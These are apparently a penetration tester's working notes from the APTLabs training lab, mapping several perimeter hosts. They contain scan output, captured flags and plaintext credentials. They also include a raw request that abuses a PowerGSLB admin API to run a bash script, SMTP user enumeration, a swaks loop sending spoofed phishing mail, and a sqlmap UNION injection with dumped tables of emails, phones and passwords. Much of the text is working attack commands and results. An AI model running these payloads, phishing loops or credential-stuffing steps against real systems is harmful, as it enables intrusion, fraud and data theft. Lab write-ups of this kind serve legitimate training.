## Flags

FLAG1

http://10.10.110.62:8080/admin/ - bob.billings  P@ssw0rd1!

Start thinking laterally
APTLABS{LaT3r@L_M0v3M3nT_w!Th_$CcM_@g3Nt}

There are two types of people...
APTLABS{R3tuRn_0F_tH3_b@CkUp_@DmIn}


## APTLabs-Perimeter

### 10.10.110.13

Logged in /admin with admin:admin combo, looks like the admin page
Refenrences to 

- 0x0security.com
- Cubano.local

In domain tab we get the first flag: APTLABS{R00t_Dn$_AdM!n} (1st)

```
53/tcp  open  domain     PowerDNS Authoritative Server 4.1.11
| dns-nsid: 
|   NSID: powergslb (706f77657267736c62)
|   id.server: powergslb
|_  bind.version: PowerDNS Authoritative Server 4.1.11
443/tcp open  ssl/caldav Radicale calendar and contacts server (Python BaseHTTPServer)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: PowerGSLB/1.7.3 Python/2.7.5
|_http-title: Error response
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-01-09T12:45:01
| Not valid after:  2021-01-08T12:45:01
| MD5:   fce2 3df5 c601 0285 49b8 5607 6b94 dc58
|_SHA-1: 5241 7b4a 9153 bb53 70cb 80dc 6296 69bc 371c 60db
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u https://10.10.110.13/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.110.13/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

admin                   [Status: 401, Size: 206, Words: 16, Lines: 10]
dns                     [Status: 200, Size: 16, Words: 1, Lines: 1]

```

views and loot from the dns thingy

```json
# views
{"status":"success","records":[{"recid":1,"rule":"0.0.0.0/0","view":"Public"},{"recid":2,"rule":"10.0.0.0/8 172.16.0.0/12 192.168.0.0/16","view":"Private"}],"total":2}

# records

{
  "status": "success",
  "records": [
    {
      "content": "ns1.0x0security.com",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 139,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "NS",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "ns1.0x0security.com. hostmaster.0x0security.com. 2016010101 21600 3600 1209600 300",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 140,
      "ttl": 86400,
      "fallback": 0,
      "view": "Public",
      "name_type": "SOA",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "storage.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 141,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "nextcloud.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 142,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "*.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 148,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "192.168.20.31",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 152,
      "ttl": 36000,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "192.168.23.10",
      "domain": "Cubano.local",
      "name": "DC.Cubano.local",
      "weight": 0,
      "disabled": 0,
      "recid": 153,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "phish.0x0security.com",
      "domain": "0x0security.com",
      "name": "*.phish.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 156,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.14",
      "domain": "0x0security.com",
      "name": "phish.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 157,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.219",
      "domain": "0x0security.com",
      "name": "*.nophish.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 158,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "0x00security.com",
      "domain": "0x00security.com",
      "name": "nextcloud.0x00security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 160,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.14",
      "domain": "0x0security.com",
      "name": "nextcloud.phish.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 161,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.9",
      "domain": "0x0security.com",
      "name": "news.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 162,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.12",
      "domain": "0x0security.com",
      "name": "t.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 163,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "10.10.14.10",
      "domain": "0x0security.com",
      "name": "owa.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 164,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "content": "nophish.0x0security.com",
      "domain": "0x0security.com",
      "name": "*.nophish.0x0security.com",
      "weight": 0,
      "disabled": 0,
      "recid": 165,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    }
  ],
  "total": 16
}



# domains
{
  "status": "success",
  "records": [
    {
      "domain": "example.net",
      "recid": 2
    },
    {
      "domain": "secure.ccc",
      "recid": 4
    },
    {
      "domain": "0x0security.com",
      "recid": 7
    },
    {
      "domain": "00security.com",
      "recid": 8
    },
    {
      "domain": "APTLABS{R00t_Dn$_AdM!n}",
      "recid": 9
    },
    {
      "domain": "Cubano.local",
      "recid": 10
    },
    {
      "domain": "0x00security.com",
      "recid": 12
    }
  ],
  "total": 7
}


#status
{
  "status": "success",
  "records": [
    {
      "status": "On",
      "content": "0x00security.com",
      "domain": "0x00security.com",
      "name": "nextcloud.0x00security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "*.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.219",
      "domain": "0x0security.com",
      "name": "*.nophish.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "nophish.0x0security.com",
      "domain": "0x0security.com",
      "name": "*.nophish.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "phish.0x0security.com",
      "domain": "0x0security.com",
      "name": "*.phish.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "192.168.20.31",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 36000,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "ns1.0x0security.com",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "NS",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "ns1.0x0security.com. hostmaster.0x0security.com. 2016010101 21600 3600 1209600 300",
      "domain": "0x0security.com",
      "name": "0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 86400,
      "fallback": 0,
      "view": "Public",
      "name_type": "SOA",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.9",
      "domain": "0x0security.com",
      "name": "news.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "nextcloud.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.14",
      "domain": "0x0security.com",
      "name": "nextcloud.phish.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.10",
      "domain": "0x0security.com",
      "name": "owa.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.14",
      "domain": "0x0security.com",
      "name": "phish.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "0x0security.com",
      "domain": "0x0security.com",
      "name": "storage.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "CNAME",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "10.10.14.12",
      "domain": "0x0security.com",
      "name": "t.0x0security.com",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    },
    {
      "status": "On",
      "content": "192.168.23.10",
      "domain": "Cubano.local",
      "name": "DC.Cubano.local",
      "weight": 0,
      "style": "color: green",
      "disabled": 0,
      "ttl": 3600,
      "fallback": 0,
      "view": "Public",
      "name_type": "A",
      "persistence": 0,
      "monitor": "No check"
    }
  ],
  "total": 16
}
```

DNS enum

0x0security.com

```
Host's addresses:
__________________

0x0security.com.                         36000    IN    A        192.168.20.31


Wildcard detection using: ffbzzycwjndj
_______________________________________

ffbzzycwjndj.0x0security.com.            3600     IN    CNAME    0x0security.com.
0x0security.com.                         36000    IN    A        192.168.20.31


!!!!!!!!!!!!!!!!!!!!!!!!!!!!

 Wildcards detected, all subdomains will point to the same IP address
 Omitting results containing 192.168.20.31.
 Maybe you are using OpenDNS servers.

!!!!!!!!!!!!!!!!!!!!!!!!!!!!


Name Servers:
______________

ns1.0x0security.com.                     3600     IN    CNAME    0x0security.com.

```




Add monitor bypassing the UI

```sh
POST /admin/w2ui HTTP/1.1
Host: 10.10.110.13
Connection: close
Content-Length: 95
Authorization: Basic YWRtaW46YWRtaW4=
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://10.10.110.13
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.10.110.13/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

cmd=save-record&recid=0&data=monitors&record[monitor]=aaaa&record[monitor_json]={"type":""}

```

Let's check this (after you get shell on nix box)

```sh
POST /admin/w2ui HTTP/1.1
Host: 10.10.110.13
Connection: close
Content-Length: 174
Authorization: Basic YWRtaW46YWRtaW4=
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://10.10.110.13
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.10.110.13/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

cmd=save-record&recid=0&data=monitors&record[monitor]=meow1&record[monitor_json]={"type":"exec","args":["bash","/tmp/meow.sh"],"interval":3,"timeout":1,"fall":3,"rise":5}

```

(so far nothing)






### 10.10.110.62

```
Nmap scan report for 10.10.110.62
Host is up (0.052s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  rtsp
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 179
|     X-Content-Type-Options: nosniff
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <title>Not Found</title>
|     </head>
|     <body>
|     <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     RTSP/1.0 404 Not Found
|     Content-Type: text/html
```

ffuf

```
root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.110.62:8080/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.110.62:8080/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
:: Progress: [20469/20469] :: Job [1/1] :: 511 req/sec :: Duration: [0:00:40] :: Errors: 0 ::

```


Django administration ,logged in with P@ssw0rd1! | bob.billings , got another flag

`APTLABS{C3RT!FICAT3_M@NAG3R}` (1st)












### 10.10.110.74

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:43:bc:ba:43:cc:2c:6e:d4:fc:d5:bc:c5:01:05:af (RSA)
|   256 02:ab:aa:01:64:de:c5:89:2f:75:e3:6a:a9:ff:78:ee (ECDSA)
|_  256 9a:c2:d3:a0:fe:6a:ad:9a:4a:85:0d:c1:15:d1:13:be (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: nextcloud, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
```

Postfix smtp

```
root@nix36:~/aptlabs# telnet 10.10.110.74 25
Trying 10.10.110.74...
Connected to 10.10.110.74.
Escape character is '^]'.
ehlo
220 nextcloud ESMTP Postfix (Ubuntu)
501 Syntax: EHLO hostname
EHLO fufutos
250-nextcloud
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8
nextcloud
502 5.5.2 Error: command not recognized
VRFY admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
VRFY admin@0x0security.com
550 5.1.1 <admin@0x0security.com>: Recipient address rejected: User unknown in local recipient table

```

Once more, vfry

```
root@nix36:~/.sqlmap/output/10.10.110.88/dump/mysql# telnet 10.10.110.74 25
Trying 10.10.110.74...
Connected to 10.10.110.74.
Escape character is '^]'.
220 nextcloud ESMTP Postfix (Ubuntu)
HELO AAAA.com
250 nextcloud
vrfy robert@0x0security.com
252 2.0.0 robert@0x0security.com
vrfy fufutos@0x0security.com
550 5.1.1 <fufutos@0x0security.com>: Recipient address rejected: User unknown in local recipient table
vrfy mark@0x0security.com
252 2.0.0 mark@0x0security.com
vrfy emma@0x0security.com
252 2.0.0 emma@0x0security.com
vrfy robert@0x0security.com
252 2.0.0 robert@0x0security.com

```


Loop to send phishes

Add a custom A record nextcloud2.0x0security.com 10.10.14.15

```
while read mail;do swaks -to "$mail" -from "robert@0x0security.com" -body "goto http://nextcloud2.0x0security.com" -header "Subject: Credentials, Errors" -server 10.10.110.74;done < mails.txt
...
=== Trying 10.10.110.74:25...
=== Connected to 10.10.110.74.
<-  220 nextcloud ESMTP Postfix (Ubuntu)
 -> EHLO nix36
<-  250-nextcloud
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250-DSN
<-  250 SMTPUTF8
 -> MAIL FROM:<robert@0x0security.com>
<-  250 2.1.0 Ok
 -> RCPT TO:<robert@0x0security.com>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 10 Dec 2020 01:36:48 +0200
 -> To: robert@0x0security.com
 -> From: robert@0x0security.com
 -> Subject: Credentials, Errors
 -> Message-Id: <20201210013648.243359@nix36>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> goto http://10.10.14.15/
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as 2FCD324115E
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.

```

So far phish is failing














### 10.10.110.88

Looks like a dataleaks portal, php

```
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: AA8602394B1E9D69B8EFCD045FFD3085
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: DataLeaks
```

ffuf

```
root@nix36:~/aptlabs# ffuf -w /usr/share/wordlists/dirb/big.txt:FUZZ -u http://10.10.110.88/FUZZ -e .php

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.110.88/FUZZ
 :: Extensions       : .php
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htaccess               [Status: 403, Size: 296, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 296, Words: 22, Lines: 12]
.htaccess.php           [Status: 403, Size: 300, Words: 22, Lines: 12]
.htpasswd.php           [Status: 403, Size: 300, Words: 22, Lines: 12]
affiliate.php           [Status: 302, Size: 0, Words: 1, Lines: 1]
beta.php                [Status: 200, Size: 0, Words: 1, Lines: 1]
cgi-bin/                [Status: 403, Size: 295, Words: 22, Lines: 12]
cgi-bin/.php            [Status: 403, Size: 299, Words: 22, Lines: 12]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
connection.php          [Status: 200, Size: 0, Words: 1, Lines: 1]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
databases               [Status: 301, Size: 316, Words: 20, Lines: 10]
databases.php           [Status: 200, Size: 26822, Words: 1563, Lines: 553]
faq.php                 [Status: 200, Size: 3784, Words: 727, Lines: 75]
favicon.ico             [Status: 200, Size: 370070, Words: 41, Lines: 28]
favicon                 [Status: 200, Size: 370070, Words: 41, Lines: 28]
fonts                   [Status: 301, Size: 312, Words: 20, Lines: 10]
header.php              [Status: 200, Size: 672, Words: 179, Lines: 14]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10]
index.php               [Status: 200, Size: 3911, Words: 1101, Lines: 123]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
min.php                 [Status: 200, Size: 521, Words: 35, Lines: 1]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 300, Words: 22, Lines: 12]

```

And we probably have an SQL injection here (blind, at least burp thinks so)

```xml
POST /index.php HTTP/1.1
Host: 10.10.110.88
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.110.88
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.110.88/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=19kvb64me0vrerqqr2uci2vhid
Connection: close

search=test'&type=password
```

Also, exposed phpmyadmin `http://10.10.110.88/phpmyadmin/`

With SQLMap we have confirmation of SQLi, lots of output

```
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=test') UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qxqqq','hgDcOvqkhvbizOkRlWwSxoVqwkQjIxRyIFgABXDv'),'qbxjq'),NULL,NULL-- AybD&type=password
---
[00:28:09] [INFO] testing MySQL
[00:28:09] [INFO] confirming MySQL
[00:28:09] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[00:28:10] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 32 times
[00:28:10] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.110.88'

[*] ending @ 00:28:10 /2020-12-10/


do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] admin [1]:
    password hash: *C7EB82FD9F35FFD9255C7751DA31D92D2926D8C7
[*] mysql.session [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] mysql.sys [1]:
    password hash: *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[*] root [1]:
    password hash: NULL

root@nix36:~/aptlabs# sqlmap -r POST_10.10.110.88 -a
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.11#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:30:53 /2020-12-10/

[00:30:53] [INFO] parsing HTTP request from 'POST_10.10.110.88'
[00:30:53] [INFO] resuming back-end DBMS 'mysql'
[00:30:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=test') UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qxqqq','hgDcOvqkhvbizOkRlWwSxoVqwkQjIxRyIFgABXDv'),'qbxjq'),NULL,NULL-- AybD&type=password
---
[00:30:53] [INFO] the back-end DBMS is MySQL
[00:30:53] [INFO] fetching banner
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL 5
banner: '5.7.26-0ubuntu0.18.04.1-log'
[00:30:53] [INFO] fetching current user
current user: 'root@localhost'
[00:30:53] [INFO] fetching current database
current database: 'dataleaks'
[00:30:54] [INFO] fetching server hostname
hostname: 'b61431390095'
[00:30:54] [INFO] testing if current user is DBA
[00:30:54] [INFO] fetching current user
current user is DBA: True
[00:30:54] [INFO] fetching database users
database management system users [4]:
[*] 'admin'@'%'
[*] 'mysql.session'@'localhost'
[*] 'mysql.sys'@'localhost'
[*] 'root'@'localhost'

[00:33:49] [WARNING] no clear password(s) found
Database: dataleaks
Table: GoGames
[2 entries]
+----------------------------------+--------------------------+-------------------+------------+-----------+
| hash                             | email                    | mobile            | password   | username  |
+----------------------------------+--------------------------+-------------------+------------+-----------+
| 3684311f2ab8cdb11eb6bdc159bd880d | kim.stone@protonmail.com | +90 653 111 67 35 | P@ssw0rd1! | Junglelee |
| <blank>                          | <blank>                  | <blank>           | <blank>    | <blank>   |
+----------------------------------+--------------------------+-------------------+------------+-----------+

Database: dataleaks
Table: collection1
[2 entries]
+----------------------------------+----------------------+-------------------+---------------+----------+
| hash                             | email                | mobile            | password      | username |
+----------------------------------+----------------------+-------------------+---------------+----------+
| 35aaa279711af9353dcd8f2e5c22b86b | mark@0x0security.com | +90 433 794 13 53 | $Ul3S@t0x0S3c | mak      |
| <blank>                          | <blank>              | <blank>           | <blank>       | mak      |
+----------------------------------+----------------------+-------------------+---------------+----------+

Database: dataleaks
Table: Edaboard
[2 entries]
+----------------------------------+--------------+-------------------+------------+----------+
| hash                             | email        | mobile            | password   | username |
+----------------------------------+--------------+-------------------+------------+----------+
| 3684311f2ab8cdb11eb6bdc159bd880d | bob@live.com | +90 432 652 14 13 | P@ssw0rd1! | <blank>  |
| <blank>                          | <blank>      | <blank>           | <blank>    | <blank>  |
+----------------------------------+--------------+-------------------+------------+----------+

Database: dataleaks
Table: MoneyBookers
[2 entries]
+----------------------------------+-----------------------------+------------------------+------------+--------------+
| hash                             | email                       | mobile                 | password   | username     |
+----------------------------------+-----------------------------+------------------------+------------+--------------+
| 3684311f2ab8cdb11eb6bdc159bd880d | bob.billings@protonmail.com | APTLABS{P@sS0rD_R3Us3} | P@ssw0rd1! | bob.billings |
| <blank>                          | <blank>                     | <blank>                | <blank>    | <blank>      |
+----------------------------------+-----------------------------+------------------------+------------+--------------+

+----------------------------------+------------------------+-------------------+------------+-------------+
| hash                             | email                  | mobile            | password   | username    |
+----------------------------------+------------------------+-------------------+------------+-------------+
| d8f40ecca9c23d665cb86579ab62c586 | robert@0x0security.com | +90 921 525 87 74 | iL0v3l!nux | linuxrobert |
| <blank>                          | <blank>                | <blank>           | <blank>    | <blank>     |
+----------------------------------+------------------------+--------

Table: gigantichosting
[2 entries]
+----------------------------------+-------------------------+-------------------+------------+----------+
| hash                             | email                   | mobile            | password   | username |
+----------------------------------+-------------------------+-------------------+------------+----------+
| 3684311f2ab8cdb11eb6bdc159bd880d | bob@gigantichosting.com | +90 763 995 34 55 | P@ssw0rd1! | bob      |
| <blank>                          | <blank>                 | <blank>           | <blank>    | <blank>  |
+----------------------------------+-------------------------+-------------------+------------+----------+


```


Now we have accounts:

`mark@0x0security.com | +90 433 794 13 53 | $Ul3S@t0x0S3c | mak ` 
`robert@0x0security.com | +90 921 525 87 74 | iL0v3l!nux | linuxrobert `

and another flag (3rd)

`APTLABS{P@sS0rD_R3Us3}`












### 10.10.110.231

```
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Promote Business Category Bootstrap Responsive Web Template | ...
